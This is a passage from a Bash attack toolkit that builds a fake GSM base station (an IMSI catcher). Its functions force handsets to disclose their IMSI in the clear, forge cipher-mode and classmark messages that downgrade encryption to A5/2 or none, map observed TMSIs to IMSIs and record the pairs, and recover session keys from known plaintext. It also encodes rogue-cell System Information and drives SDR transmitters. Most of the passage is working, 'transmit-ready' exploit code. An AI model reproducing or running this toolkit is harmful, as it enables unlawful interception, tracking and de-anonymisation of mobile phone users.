    printf 'step\t4\tSDCCH\tIDENTITY REQUEST (IMSI) on the assigned downlink block\n'
    printf 'step\t5\tSDCCH\tMS answers IDENTITY RESPONSE carrying the IMSI in the clear\n'
    printf '\n'
    printf '# the forced message, already LAPDm framed\n'
    printf 'identity_request_l3\t%s\n' "$ir"
    printf 'identity_request_lapdm\t%s\n' "$(printf '%s\n' "$lapdm" | awk -F'\t' '$1=="frame"{print $2}')"
    # The AGCH answer, built rather than described. It names the SDCCH/4
    # sub-channel the identity exchange will actually run on and echoes the
    # RACH in its Request Reference. There is NO LAPDm on this message: the
    # AGCH is a common control channel, so the RR message is carried directly
    # and its first octet is the L2 pseudo length (TS 44.018 9.1.18).
    local ia_l3
    ia_l3=$(gatk_build_immediate_assignment 0c "$(( 51 + 6 ))" 0 sdcch4 0 "$arfcn" "$bsic" 0 0 2b \
            | awk -F'\t' '$1=="l3"{print $2}')
    printf 'immediate_assignment_l3\t%s\n' "$ia_l3"
    printf 'immediate_assignment_l2pl\t%s\n' "$(gatk_build_immediate_assignment 0c "$(( 51 + 6 ))" 0 sdcch4 0 "$arfcn" "$bsic" 0 0 2b | awk -F'\t' '$1=="l2_pseudo_length"{print $2}')"
    printf '\n'
    printf 'lapdm_address\t%s\n' "$(printf '%s\n' "$lapdm" | awk -F'\t' '$1=="address"{print $2}')"
    printf 'lapdm_control\t%s\n' "$(printf '%s\n' "$lapdm" | awk -F'\t' '$1=="control"{print $2}')"
    printf 'lapdm_length\t%s\n' "$(printf '%s\n' "$lapdm" | awk -F'\t' '$1=="length"{print $2}')"
    printf '\n'
    printf '# frame schedule, first multiframe at FN %s\n' "$startfn"
    gatk_sched_header
    local mf off
    for mf in 0 1 2; do
        gatk_sched_row "$mf" 0  FCCH DL FB  -            'frequency correction burst'
        gatk_sched_row "$mf" 1  SCH  DL SB  "$schbits"   "BSIC $bsic + RFN"
        gatk_sched_row "$mf" 2  BCCH DL NB  'SI1'        'control channel description: CCCH_CONF, BS_AG_BLKS_RES, BS_PA_MFRMS'
        gatk_sched_row "$mf" 3  BCCH DL NB  'SI2'        'neighbour cells for reselection'
        gatk_sched_row "$mf" 4  BCCH DL NB  "SI3 $lai"   'LAI, CI, C1 hysteresis'
        gatk_sched_row "$mf" 5  BCCH DL NB  'SI4'        'optional, LAI/CI on the traffic channel'
        if (( mf == 1 )); then
            gatk_sched_row "$mf" 6 AGCH DL NB "$ia_l3" 'answer to the RACH: the MS is sent to SDCCH/4(0)'
        else
            gatk_sched_row "$mf" 6 'CCCH(B0)' DL NB '-' 'paging or access grant (reserved: BS_AG_BLKS_RES leak)'
        fi
        for off in 12 16; do
            (( off / 4 - 2 < nblocks )) || continue
            gatk_sched_row "$mf" "$off" "CCCH(B$(( off / 4 - 2 )))" DL NB '-' 'paging or access grant'
        done
        if (( mf >= 1 )); then
            for off in 22 23 24 25; do
                gatk_sched_row "$mf" "$off" 'SDCCH/4(0)' DL NB \
                    "$([[ $off == 22 ]] && printf '%s' "$ir" || printf '%s' '030301')" \
                    "$([[ $off == 22 ]] && printf 'IDENTITY REQUEST' || printf 'LAPDm fill')"
            done
            for off in 37 38 39 40; do
                gatk_sched_row "$mf" "$off" 'SDCCH/4(0)' UL NB '- ' 'the MS answers here: IDENTITY RESPONSE with the IMSI'
            done
        fi
    done
    printf '\n'
    printf '# expected result\n'
    printf 'loot\t%s/gsm_attack/\n' "$LOOT_DIR"
    printf 'captured\tIMSI in the IDENTITY RESPONSE, in the clear (TS 24.008 9.4.12)\n'
    printf 'record\tcall --imsi-catcher-sequence for the state machine and --deanon-record to store the mapping\n'
    printf '\n'
    printf '# limits that are not arithmetic\n'
    printf 'limit\tC1 must beat the real cell, so the transmitter normally needs more uplink power than the real BTS\n'
    printf 'limit\tTS 44.018 fixes the messages; it cannot tell you whether a given handset accepts a clone in a given location area\n'
    printf 'limit\tan MS already registered on the real LA may ignore the LA of the clone\n'
}

# ── 2. A5/1 downgrade ──────────────────────────────────────────────────
# The Cipher Mode Command is a downlink RR message on the SDCCH, and it has to
# land in the SDCCH window the Immediate Assignment opened — after the MS has
# sent CIPHERING MODE COMPLETE for any earlier cipher, and before it tears the
# link down. The forged command names A5/2 or A5/0; the MS re-advertises a
# classmark with the A5/1 capability bit cleared so the network never asks for
# it again.
gatk_vector_a5_downgrade() {   # [target-alg] [sdcch 4|8] [subchannel] [start-fn] [tmsi]
    local alg="${1:-A5/2}" kind="${2:-4}" sub="${3:-0}" startfn="${4:-0}" tmsi
    tmsi=$(gatk_norm_hex "${5:-0f200001}")
    case "$alg" in A5/0|A5/1|A5/2|A5/3|A5/4) ;; *)
        printf 'ERROR\ttarget algorithm must be A5/0..A5/4 (got %s)\n' "$alg" >&2; return 2 ;; esac
    [[ "$kind" == 4 || "$kind" == 8 ]] || {
        printf 'ERROR\tSDCCH must be 4 (combined with CCCH) or 8 (stand-alone)\n' >&2; return 2; }
    [[ "$sub" =~ ^[0-9]+$ ]] || { printf 'ERROR\tsubchannel must be a number\n' >&2; return 2; }
    [[ "$tmsi" =~ ^[0-9a-f]{8}$ ]] || { printf 'ERROR\tTMSI must be 8 hex digits\n' >&2; return 2; }
    local maxsub=$(( kind - 1 ))
    (( sub <= maxsub )) || {
        printf 'ERROR\tSDCCH/%s has subchannels 0..%s (got %s)\n' "$kind" "$maxsub" "$sub" >&2; return 2; }

    # gatk_build_cipher_mode prints the whole layer-3 message as bare hex,
    # and gatk_alg_wire_code prints the bare identifier; neither is TSV.
    local cm_l3; cm_l3=$(gatk_build_cipher_mode "$alg" 0) || return $?
    local wire; wire=$(gatk_alg_wire_code "$alg") || return $?
    local lapdm; lapdm=$(gatk_lapdm_ui 0 1 "$cm_l3") || return $?
    local frame; frame=$(printf '%s\n' "$lapdm" | awk -F'\t' '$1=="frame"{print $2}')
    # The A5/1 field is the raw wire bit: 0 = available, 1 = not available
    # (TS 24.008 10.5.1.5). Start from 0 = available, so the downgrade — which
    # SETS that bit — actually produces a different octet.
    local before; before=$(gatk_classmark_encode 3 0 0 3)
    local after; after=$(gatk_classmark_downgrade "$before" | awk -F'\t' '$1=="after"{print $2}')
    local sdc; sdc=$(gatk_sdcch_block_frames "$kind" "$sub")
    local dlo ulo
    dlo=$(printf '%s\n' "$sdc" | awk -F'\t' '$1=="dl_offsets"{print $2}')
    ulo=$(printf '%s\n' "$sdc" | awk -F'\t' '$1=="ul_offsets"{print $2}')

    printf 'vector\ta5-downgrade\n'
    printf 'objective\tforge CIPHERING MODE COMMAND for %s inside the SDCCH window\n' "$alg"
    printf 'status\ttransmit-ready\n'
    printf 'gated\tthe schedule below is computed, not keyed: --tx-ack is required before any radio is driven\n'
    gatk_vector_needs
    printf '\n'
    printf '# the message (TS 24.008 9.4.9 / TS 44.018 9.1.9)\n'
    printf 'algorithm\t%s\n' "$alg"
    printf 'wire_code\t%s\n' "$wire"
    printf 'ciphering_mode_command_l3\t%s\n' "$cm_l3"
    printf 'l3_octets\t%s\n' "$cm_l3"
    printf 'lapdm_frame\t%s\n' "$frame"
    printf 'lapdm_address\t%s\n' "$(printf '%s\n' "$lapdm" | awk -F'\t' '$1=="address"{print $2}')"
    printf 'lapdm_control\t%s\n' "$(printf '%s\n' "$lapdm" | awk -F'\t' '$1=="control"{print $2}')"
    printf 'lapdm_length\t%s\n' "$(printf '%s\n' "$lapdm" | awk -F'\t' '$1=="length"{print $2}')"
    printf '\n'
    printf '# classmark downgrade: advertise A5/1 as unavailable\n'
    printf 'classmark_before\t%s\n' "$before"
    printf 'classmark_after\t%s\n' "$after"
    printf 'a5_1_before\t%s\n' "$(gatk_classmark_decode "$before" | awk -F'\t' '$1=="a5_1"{print $2}')"
    printf 'a5_1_after\t%s\n' "$(gatk_classmark_decode "$after"  | awk -F'\t' '$1=="a5_1"{print $2}')"
    printf 'downgrade_effective\t%s\n' "$([[ "$before" != "$after" ]] && echo yes || echo 'NO — the octet did not change')"
    printf 'note\tTS 24.008 10.5.1.5: A5/1 supported bit, 0 = A5/1 available, 1 = not\n'
    printf 'note\tavailable. The forged Classmark Change SETS it, so the network sees a\n'
    printf 'note\tME that cannot do A5/1 and assigns A5/2 on the next assignment.\n'
    printf 'note\tThe ME sends its Classmark Change as soon as the link is up, so the\n'
    printf 'note\tforged command must arrive after the first classmark and before any\n'
    printf 'note\tciphering starts. Re-sending the Forged Classmark is what makes the\n'
    printf 'note\tnetwork itself pick the weaker algorithm on the next assignment.\n'
    printf '\n'
    printf '# where the command lands: SDCCH/%s sub-channel %s\n' "$kind" "$sub"
    printf 'dl_block_offsets\t%s\n' "$dlo"
    printf 'ul_block_offsets\t%s\n' "$ulo"
    printf 'window_frames\t4 (one LAPDm block = 4 bursts at 114 coded bits, TS 45.003)\n'
    printf '\n'
    printf '# frame schedule\n'
    gatk_sched_header
    local off mf
    for mf in 0 1; do
        gatk_sched_row "$mf" 0  FCCH DL FB -      'the MS is already camped; kept so it stays locked'
        gatk_sched_row "$mf" 1  SCH  DL SB -      'frame clock'
        for off in $dlo; do
            if (( mf == 0 && off == ${dlo%% *} )); then
                gatk_sched_row "$mf" "$off" "SDCCH/$kind($sub)" DL NB "$cm_l3" \
                    "CIPHERING MODE COMMAND ($alg) — burst $(( (off - ${dlo%% *}) + 1 )) of 4"
            else
                gatk_sched_row "$mf" "$off" "SDCCH/$kind($sub)" DL NB '030301' 'LAPDm fill'
            fi
        done
        for off in $ulo; do
            gatk_sched_row "$mf" "$off" "SDCCH/$kind($sub)" UL NB '-' \
                'CIPHERING MODE COMPLETE, or the first A5/x-encrypted frame'
        done
    done
    printf '\n'
    printf '# what the MS does next, and what that buys\n'
    printf 'response\tCIPHERING MODE COMPLETE, then every frame on the link is keyed with %s\n' "$alg"
    printf 'keystream\t%s\n' "$([[ "$alg" == A5/0 ]] && echo 'none — A5/0 is no encryption at all' || echo "see --a5-${alg#A5/}-keystream")"
    printf 'impact\t%s\n' "$([[ "$alg" == A5/0 ]] && echo 'the whole session, including the IMSI and any SMS, is readable with no key at all' || echo 'Kc recovery becomes a 2^16 search or an offline attack instead of infeasible')"
    printf '\n'
    printf '# limits that are not arithmetic\n'
    printf 'limit\tA5/2 was withdrawn in 2006 but many handsets still advertise support; a handset that refuses it will reject the command\n'
    printf 'limit\tthe forged command must reach the MS in the same LAPDm window the network would use, or the MS treats it as a protocol error and releases\n'
}
# ── 3. TMSI de-anonymisation ──────────────────────────────────────────
# A TMSI is only anonymous until the network has to page it in a way an
# observer can predict, or until something on the link makes it send an IMSI.
# This vector does both halves: it says when the target's own paging group
# makes it listen, and it supplies the exchange that converts an observed
# TMSI into the IMSI behind it. The correlation is written to the module's
# store so a second sighting corroborates rather than duplicates.
gatk_vector_tmsi_deanon() {   # <tmsi-hex8> <imsi> [pam] [res] [ccch-conf] [start-fn] [observed-block]
    local tmsi imsi pam res conf startfn block
    # Bare invocation demos on one concrete pair so the vector always prints a
    # worked schedule; both are obvious placeholders, not a real subscriber.
    tmsi=$(gatk_norm_hex "${1:-4a1f3c2b}"); imsi="${2:-262011234567890}"
    pam="${3:-2}"; res="${4:-0}"; conf="${5:-001}"; startfn="${6:-0}"; block="${7:-}"
    gatk_deanon_field_check "$tmsi" "$imsi" "" || return $?
    local confline comb
    confline=$(gatk_ccch_conf "$conf") || return $?
    comb=$(printf '%s\n' "$confline" | awk -F'\t' '$1=="bs_ccch_sdcch_comb"{print $2}')
    local maxb; maxb=$(gatk_ccch_blocks_available "$comb")
    local pblocks=$(( maxb - res ))
    (( pblocks >= 1 )) || {
        printf 'ERROR\tBS_AG_BLKS_RES %s leaves no paging blocks in %s CCCH blocks\n' "$res" "$maxb" >&2
        return 2; }

    local sched; sched=$(gatk_paging_schedule "$imsi" "$pam" "$res" "$pblocks" 1 "$startfn" "$comb") || return $?
    local pg ccblk f0 last0 peri
    pg=$(printf '%s\n' "$sched" | awk -F'\t' '$1=="paging_group"{print $2}')
    ccblk=$(printf '%s\n' "$sched" | awk -F'\t' '$1=="ccch_block"{print $2}')
    f0=$(printf '%s\n' "$sched" | awk -F'\t' '$1=="block_first_offset"{print $2}')
    last0=$(printf '%s\n' "$sched" | awk -F'\t' '$1=="occasion1_last_fn"{print $2}')
    peri=$(printf '%s\n' "$sched" | awk -F'\t' '$1=="period_frames"{print $2}')

    local ir lapdm frame
    ir=$(gatk_build_identity_request 1 | awk -F'\t' '$1=="octets"{print $2}')
    lapdm=$(gatk_lapdm_ui 0 1 "$ir")
    frame=$(printf '%s\n' "$lapdm" | awk -F'\t' '$1=="frame"{print $2}')

    printf 'vector\ttmsi-deanon\n'
    printf 'objective\tmap an observed TMSI to the IMSI behind it\n'
    printf 'status\ttransmit-ready\n'
    printf 'status_alt\tpassive-observe: the paging side needs no transmitter at all\n'
    gatk_vector_needs
    printf '\n'
    printf '# the target\n'
    printf 'tmsi\t%s\n' "$tmsi"
    printf 'imsi\t%s\n' "$imsi"
    printf 'ccch_conf\t%s\n' "$conf"
    printf 'bs_ccch_sdcch_comb\t%s\n' "$comb"
    printf 'bs_pa_mfrms\t%s\n' "$pam"
    printf 'bs_ag_blks_res\t%s\n' "$res"
    printf 'paging_blocks_per_mf\t%s\n' "$pblocks"
    printf '\n'
    printf '# where the network has to page it (TS 45.002 6.5.2 / 6.5.3)\n'
    printf 'paging_group\t%s\n' "$pg"
    printf 'ccch_block\t%s\n' "$ccblk"
    printf 'multiframe_phase\t%s\n' "$(printf '%s\n' "$sched" | awk -F'\t' '$1=="multiframe_index"{print $2}')"
    printf 'cycle_multiframes\t%s\n' "$(printf '%s\n' "$sched" | awk -F'\t' '$1=="cycle_multiframes"{print $2}')"
    printf 'first_occasion\t%s\n' "$(printf '%s\n' "$sched" | awk -F'\t' '$1=="occasion1_first_fn"{print $2}')"
    printf 'period_frames\t%s\n' "$peri"
    printf 'period_ms\t%s\n' "$(printf '%s\n' "$sched" | awk -F'\t' '$1=="period_ms"{print $2}')"
    printf 'note\tThe MS only listens on this block. Watching the other CCCH blocks\n'
    printf 'note\tfor this TMSI is wasted time and, worse, watching only a random block\n'
    printf 'note\tis why a TMSI can look un-pageable when it is simply paged elsewhere.\n'
    printf '\n'
    printf '# frame schedule: the paging occasions, then the forced identity\n'
    gatk_sched_header
    local mf t
    for mf in 0 1 2; do
        t=$(( startfn / 51 + mf ))
        gatk_sched_row "$t" "$f0" "CCCH(B$ccblk)" DL NB "PAGING REQUEST 1 tmsi=$tmsi" 'the target wakes up on exactly this block'
        gatk_sched_row "$t" "$(( f0 + 1 ))" "CCCH(B$ccblk)" DL NB '-' 'second paging message slot in the same block'
        gatk_sched_row "$t" "$(( (f0 + 4) % 51 ))" 'CCCH' UL AB 'access burst, random reference' 'the MS answers the page with a RACH'
        gatk_sched_row "$t" 22 'SDCCH/4(0)' DL NB "$ir" 'IDENTITY REQUEST after the Immediate Assignment'
        gatk_sched_row "$t" 23 'SDCCH/4(0)' DL NB '030301' 'LAPDm fill'
        gatk_sched_row "$t" 24 'SDCCH/4(0)' DL NB '030301' 'LAPDm fill'
        gatk_sched_row "$t" 25 'SDCCH/4(0)' DL NB '030301' 'LAPDm fill'
        gatk_sched_row "$t" 37 'SDCCH/4(0)' UL NB 'IDENTITY RESPONSE' 'the IMSI arrives here, unencrypted'
    done
    printf '\n'
    printf '# the forced message\n'
    printf 'identity_request_l3\t%s\n' "$ir"
    printf 'identity_request_lapdm\t%s\n' "$frame"
    printf '\n'
    printf '# correlation result'
    if [[ -n "$block" ]]; then
        local verdict
        verdict=$(gatk_deanon_confirm "$tmsi" "$imsi" "$block" "$pam" "$pblocks" "$res") || return $?
        printf '\n'
        printf '%s\n' "$verdict"
    else
        printf '\n'
        printf 'verdict\tunproven\n'
        printf 'note\tpass the CCCH block the TMSI was actually paged in as the 7th\n'
        printf 'note\targument and the prediction can confirm or contradict the pairing.\n'
    fi
    printf '\n'
    gatk_deanon_record "$tmsi" "$imsi" "" 'paging-correlation' "$f0" >/dev/null
    printf 'stored\t%s\n' "$GATK_DEANON_DB"
    gatk_deanon_lookup "$tmsi" >/dev/null 2>&1 && {
        printf 'observations\t%s\n' "$(gatk_deanon_lookup "$tmsi" | awk -F'\t' '$1=="observations"{print $2}')"
        printf 'state\t%s\n' "$(gatk_deanon_lookup "$tmsi" | awk -F'\t' '$1=="state"{print $2}')"
    }
    printf '\n'
    printf '# limits that are not arithmetic\n'
    printf 'limit\tpaging_group is derived from the IMSI, so a correct prediction proves the IMSI is CONSISTENT with the observation; it does not prove it is the only one\n'
    printf 'limit\tBS_PA_MFRMS and BS_AG_BLKS_RES are broadcast in SI3, so they must be read from the real cell before the prediction means anything\n'
    printf 'limit\ta TMSI reallocation moves the target between identity-request windows without changing the IMSI\n'
}

# ── 4. Kc recovery ────────────────────────────────────────────────────
# A5/1 and A5/2 are stream ciphers: ciphertext = plaintext XOR keystream. Every
# bit of plaintext you can predict hands you the matching keystream bit for
# free. The exchange below is the one that produces that plaintext on demand.
gatk_vector_kc_recovery() {   # [kc-hex16] [known-frames 1..26] [start-fn]
    local kc; kc=$(gatk_norm_hex "${1:-}")
    local kframes="${2:-2}" startfn="${3:-0}"
    [[ -z "$kc" || "$kc" =~ ^[0-9a-f]{16}$ ]] || {
        printf 'ERROR\tKc must be 16 hex digits (got %s)\n' "$kc" >&2; return 2; }
    [[ "$kframes" =~ ^[0-9]+$ ]] && (( kframes >= 1 && kframes <= 26 )) || {
        printf 'ERROR\tknown frames must be 1..26 (one 26-multiframe)\n' >&2; return 2; }

    local bits=$(( kframes * 2 * 114 ))
    printf 'vector\tkc-recovery\n'
    printf 'objective\trecover Kc from a chosen-plaintext exchange on an A5/1 or A5/2 link\n'
    printf 'status\ttransmit-ready\n'
    printf 'gated\tthe schedule below is computed, not keyed: --tx-ack is required before any radio is driven, and this places a call and captures the traffic channel\n'
    gatk_vector_needs
    printf '\n'
    printf '# why a known plaintext is the whole attack\n'
    printf 'relation\tciphertext = plaintext XOR keystream  (A5/1 and A5/2 are stream ciphers)\n'
    printf 'consequence\tany frame whose plaintext you know yields 114 keystream bits per direction\n'
    printf 'per_frame\t228 bits: one A5/1 state, downlink in bits 0..113 and uplink in 114..227\n'
    printf 'dummy_burst\t142 known plaintext bits per idle C0 timeslot, no call required (TS 45.002 5.2.6)\n'
    printf 'needed\tkeystream from 2 frames = 456 bits in the published formulation\n'
    printf '\n'
    printf '# the exchange: what the MS transmits that you already know\n'
    printf 'step\t1\tstart with the cheapest source: an idle timeslot on C0 carries the fixed dummy burst, 142 known bits, no call needed\n'
    printf 'step\t2\tfor a ciphered traffic channel, place a TCH/F call to the target and stay silent\n'
    printf 'step\t3\tthe MS transmits its first uplink frames before any speech: the silence frame\n'
    printf 'step\t4\tthe pattern is fixed by the codec, not by the user, so the plaintext is known in advance\n'
    printf 'step\t5\tthe first SACCH block and the LAPDm fill frames (030301) are also known\n'
    printf 'step\t6\tXOR the observed ciphertext against the known plaintext: that is the keystream\n'
    printf 'step\t7\tfeed the keystream to the A5/1 state search, or to the A5/2 key search\n'
    printf '\n'
    printf '# keystream budget for this run\n'
    printf 'known_frames\t%s\n' "$kframes"
    printf 'bits_per_burst\t114\n'
    printf 'directions\t2\n'
    printf 'keystream_bits\t%s\n' "$bits"
    printf 'a5_1_search\t%s\n' "$([[ $bits -ge 456 ]] && echo 'enough for the published two-frame attack' || echo 'one frame is 228 bits; the published attack is stated for two frames (456 bits), though a precomputed table only needs a single frame in practice')"
    printf 'a5_2_search\t%s\n' "$([[ $bits -ge 114 ]] && echo 'a single frame is enough: A5/2 falls to a 2^16 search over the key' || echo 'INSUFFICIENT: A5/2 needs 114 bits')"
    printf '\n'
    printf '# frame schedule: the 26-multiframe the known plaintext comes from\n'
    gatk_sched_header
    local i mf
    for (( i = 0; i < kframes; i++ )); do
        mf=$(( startfn / 51 + i ))
        gatk_sched_row "$mf" 0 'TCH/F' UL NB 'SILENCE FRAME' 'known plaintext, fixed by the codec — keystream bits 0..113'
        gatk_sched_row "$mf" 1 'TCH/F' DL NB '-' 'downlink; A5/1 uses the same Kc and a frame counter, so recover both directions'
        gatk_sched_row "$mf" 12 'SACCH/TF' UL NB 'MEASUREMENT REPORT' 'partly known structure: a second source of plaintext'
        gatk_sched_row "$mf" 13 'SACCH/TF' DL NB 'SYSTEM INFORMATION' 'also largely known'
    done
    printf '\n'
    printf '# search arithmetic, whatever Kc is in use\n'
    printf 'a5_1_key_bits\t64\n'
    printf 'a5_2_key_bits\t64\n'
    printf 'a5_2_effective\t2^16 (A5/2 is deliberately weak; the state search collapses)\n'
    printf 'a5_3_key_bits\t64 or 128\n'
    printf 'a5_3_note\tA5/3 is KASUMI-based and has no published practical attack; recovering Kc is not the same as breaking A5/3\n'
    printf '\n'
    if [[ -n "$kc" ]]; then
        printf '# this run has a Kc, so the exchange can be simulated end to end\n'
        printf 'kc\t%s\n' "$kc"
        # 224 bits = 28 octets. 228 would not be whole octets, and the XOR
        # below works a byte at a time, so a 57-nibble keystream cannot be used.
        local ks plain ct
        ks=$(gatk_a5_1_hex "$kc" "$startfn" 224 2>/dev/null)
        printf 'a5_1_keystream_224\t%s\n' "${ks:-unavailable}"
        plain=$(printf '4141414141414141414141414141414141414141414141414141414141414141')
        ct=$(gatk_xor_hex "$plain" "$ks" 2>/dev/null)
        printf 'known_plaintext\t%s\n' "$plain"
        printf 'observed_ciphertext\t%s\n' "${ct:-unavailable}"
        printf 'recovered_keystream\t%s\n' "$(gatk_xor_hex "$ct" "$plain" 2>/dev/null || echo unavailable)"
        printf 'match\t%s\n' "$([[ "$(gatk_xor_hex "$ct" "$plain" 2>/dev/null)" == "$ks" ]] && echo yes || echo no)"
        printf '\n'
        printf '# verifying a candidate key without the radio\n'
        printf 'verify\t--kc-verify <candidate-kc> <keystream-hex>  compares a candidate against recovered keystream\n'
        printf 'search\t--kc-search <base-kc> <vary-low-bits> <count> <keystream-bits-0/1> [max-tries]\n'
    else
        printf 'kc\tnot supplied — pass one as the first argument to simulate the exchange\n'
    fi
    printf '\n'
    printf '# limits that are not arithmetic\n'
    printf 'limit\tthe codec silence frame is known only for the codec in use; a link running a codec you have not modelled gives you no plaintext\n'
    printf 'limit\tA5/3 and A5/4 have no published practical break, so on a modern link this exchange yields Kc only if the network is running A5/1 or A5/2\n'
    printf 'limit\tfrequency hopping moves the link between ARFCNs mid-call and the schedule above assumes a fixed channel\n'
}

# ── the transmit path ───────────────────────────────────────────────────
# Everything above this line computes octets and schedules. This section turns
# them into a waveform and, when a transmitter is attached, keys it.
#
# The chain, in order:
#   L2 octets -> xCCH  (FIRE CRC-40, rate-1/2 K=5 convolutional code, 456-bit
#                       interleave, four 116-bit bursts)
#             -> multiframe  (FCCH at FN 0/6/12/18/24, SCH at 1/7/13/19/25,
#                             BCCH blocks at the rest of FN 2..29)
#             -> GMSK  (Laurent C0: NRZ to +-1, a quarter turn per symbol,
#                       convolution with the 4 sps shaping pulse)
#             -> int8 I/Q at a rate the SDR accepts -> hackrf_transfer
#
# Every stage is asserted against libosmocoding 1.7.0 or against gr-gsm's own
# receiver, never against this module's own output. `tools/gsm_mod.py selftest`
# carries the vectors; `tools/gsm_mod.py carrier --format cfile` writes a
# stream that `grgsm_decode -m BCCH` decodes back to the octets that went in.

gatk_gsm_mod() { printf '%s/tools/gsm_mod.py' "$IMSISTING_ROOT"; }

# Installed is not attached. hackrf_info ships in the same package as
# hackrf_transfer, so `command -v` passes on a machine with no radio at all --
# which is exactly the machine this file is written on. This probe asks the
# hardware and requires a positive answer.
gatk_tx_device() {
    local out
    case "$(gatk_find_tx_sdr 2>/dev/null || true)" in
        hackrf)
            command -v hackrf_info >/dev/null 2>&1 || return 1
            out=$(timeout 15 hackrf_info 2>&1) || return 1
            printf '%s\n' "$out" | grep -qiE 'no hackrf|not found|no devices|could not|failed to' && return 1
            printf '%s\n' "$out" | grep -q 'Serial number' || return 1
            printf 'hackrf\n'; return 0 ;;
        bladerf)
            command -v bladeRF-cli >/dev/null 2>&1 || return 1
            out=$(timeout 15 bladeRF-cli -p 2>&1) || return 1
            printf '%s\n' "$out" | grep -qi 'backend:.*bladerf' || return 1
            printf 'bladerf\n'; return 0 ;;
        limesdr)
            command -v LimeUtil >/dev/null 2>&1 || return 1
            out=$(timeout 15 LimeUtil --find 2>&1) || return 1
            printf '%s\n' "$out" | grep -qi 'found' || return 1
            printf 'limesdr\n'; return 0 ;;
        usrp)
            command -v uhd_find_devices >/dev/null 2>&1 || return 1
            out=$(timeout 15 uhd_find_devices 2>&1) || return 1
            printf '%s\n' "$out" | grep -qi 'device address' || return 1
            printf 'usrp\n'; return 0 ;;
    esac
    return 1
}

gatk_iq_path() { printf '%s/tx_%s.cs8' "$GATK_DIR" "${1:-carrier}"; }

# ── System Information, built as octets rather than named ───────────────
# TS 44.018 9.1.3. On the BCCH the LAPDm frame is address + control +
# information: there is NO length octet, because each System Information
# message type has a fixed length and the receiver knows it. That is why SI1
# and SI2 are exactly 21 octets of L3 -- they fill the 23-octet block with a
# 2-octet header and no slack. (gatk_lapdm_ui above is the SDCCH/SACCH form,
# which does carry a length octet.)
gatk_bcch_frame() {   # <l3-hex> -> a 23-octet BCCH radio block
    local l3; l3=$(gatk_norm_hex "${1:-}")
    gatk_is_hex "$l3" || { printf 'ERROR\tBCCH L3 must be hex\n' >&2; return 2; }
    local n=$(( ${#l3} / 2 ))
    (( n <= 21 )) || {
        printf 'ERROR\tBCCH L3 is %d octets; a 23-octet block holds 21 after the 2-octet LAPDm header\n' "$n" >&2
        return 2; }
    local pad=$(( 23 - 2 - n ))
    printf '0303%s' "$l3"
    (( pad > 0 )) && printf '%0*d' $(( pad * 2 )) 0
    printf '\n'
}

# The 16-octet Cell Channel Description / Neighbour Cells Description,
# "bit map 0" format (TS 44.018 10.5.2.1b): octet 1 is the format ID 0, then
# 15 octets of ARFCN bits with ARFCN 0 in bit 8 of octet 2.
gatk_chan_desc_bitmap0() {   # <arfcn> [<arfcn> ...]
    local bits; bits=$(printf '0%.0s' $(seq 1 120))
    local a
    for a in "$@"; do
        [[ "$a" =~ ^[0-9]+$ ]] || { printf 'ERROR\tARFCN must be a number: %s\n' "$a" >&2; return 2; }
        (( a <= 123 )) || { printf 'ERROR\tbit map 0 covers ARFCN 0..123, got %s\n' "$a" >&2; return 2; }
        bits="${bits:0:$a}1${bits:$(( a + 1 ))}"
    done
    local out="" i byte
    for (( i = 0; i < 120; i += 8 )); do
        byte=0
        for (( j = 0; j < 8; j++ )); do
            [[ "${bits:$(( i + j )):1}" == 1 ]] && byte=$(( byte | (1 << (7 - j)) ))
        done
        out+=$(printf '%02x' "$byte")
    done
    printf '00%s\n' "$out"
}

# RACH Control Parameters, 3 octets (TS 44.018 10.5.2.29). All-zero ACC means
# no access class is barred, MAX_TXPWR_CNT 0 means the MS may use its maximum
# power, TX_INTEGER 0 means it may transmit at any time, CELL_BAR_ACCESS 0
# means the cell is not barred -- and RE=0, EC=0.
gatk_rach_control() { printf '000000\n'; }

gatk_build_si1() {   # <arfcn>... [--neighbours <arfcn>...]
    local arfcns=() a; for a in "$@"; do arfcns+=("$a"); done
    printf '60'                                    # PD 0110 | skip 0000
    printf '19'                                    # System Information Type 1
    gatk_chan_desc_bitmap0 "${arfcns[@]}"
    gatk_rach_control
}

gatk_build_si2() {   # <neighbour-arfcn>...
    printf '60'; printf '1a'
    gatk_chan_desc_bitmap0 "$@"
    gatk_rach_control
}

# Control Channel Description, 3 octets (TS 44.018 10.5.2.4).
gatk_ctrl_chan_desc() {   # <ccch-conf 0..7> <bs-ag-blks-res 0..7> <bs-pa-mfrms 0..7> <t3212 0..255> <att 0|1>
    local conf="${1:-1}" res="${2:-2}" pam="${3:-2}" t="${4:-10}" att="${5:-1}"
    local o1=$(( ((att & 1) << 3) | ((t >> 5) & 7) ))
    local o2=$(( ((t & 31) << 3) | (res & 7) ))
    local o3=$(( ((conf & 7) << 5) | ((pam & 7) << 2) ))
    printf '%02x%02x%02x\n' "$o1" "$o2" "$o3"
}

# Cell Selection Parameters, 2 octets (TS 44.018 10.5.2.4b? no: see 9.1.35).
# RXLEV_ACCESS_MIN 0 = -110 dBm, the lowest the field can express, so C1 is
# as favourable as the encoding allows. MS_TXPWR_MAX_CCH 0 = 43 dBm on GSM
# 900, which lets the handset answer an access at full power.
gatk_cell_selection() { printf '0000\n'; }

# gatk_lai_encode above returns the LOCATION UPDATING ACCEPT form: a type-5
# IE, so an IEI 0x05 followed by the 5 octets. Inside SI3 and SI4 the LAI is a
# bare field with no IEI, so the 0x05 has to come off.
gatk_lai_field() {   # <mcc> <mnc> <lac> -> the bare 5 octets
    local iei; iei=$(gatk_lai_encode "$@") || return $?
    printf '%s\n' "${iei:2}"
}

gatk_build_si3() {   # <mcc> <mnc> <lac> <ci> [conf] [res] [pam] [t3212] [att]
    local mcc="${1:-262}" mnc="${2:-01}" lac="${3:-00f1}" ci="${4:-00a1}"
    printf '60'; printf '1b'
    gatk_lai_field "$mcc" "$mnc" "$lac"
    printf '%s\n' "$(gatk_norm_hex "$ci")"
    gatk_ctrl_chan_desc "${5:-1}" "${6:-2}" "${7:-2}" "${8:-10}" "${9:-1}"
    gatk_cell_selection
    gatk_rach_control
}

gatk_build_si4() {   # <mcc> <mnc> <lac> <ci>
    local mcc="${1:-262}" mnc="${2:-01}" lac="${3:-00f1}" ci="${4:-00a1}"
    printf '60'; printf '1c'
    gatk_lai_field "$mcc" "$mnc" "$lac"
    printf '%s\n' "$(gatk_norm_hex "$ci")"
    gatk_cell_selection
    gatk_rach_control
}

# ── the transmit verb ───────────────────────────────────────────────────
# Builds the waveform, asks for a transmitter, and either keys it or exits
# non-zero naming what is missing. There is no path through this function that
# prints a success line without a radio having accepted the samples.
